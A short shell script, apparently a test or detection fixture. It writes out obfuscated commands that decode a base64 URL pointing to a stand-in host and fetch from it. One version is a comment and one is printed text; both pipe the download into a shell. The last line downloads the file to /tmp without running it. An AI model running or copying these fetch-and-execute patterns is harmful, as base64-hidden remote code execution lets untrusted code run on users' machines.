#!/bin/sh
# curl -s $(echo "aHR0cHM6Ly9hLnRlc3QveC95" | openssl base64 -d -A) | bash
printf '%s\n' 'curl -s $(echo "aHR0cHM6Ly9hLnRlc3QveC95" | base64 -d) | sh'
curl -s $(echo "aHR0cHM6Ly9hLnRlc3QveC95" | base64 -d) -o /tmp/document.txt
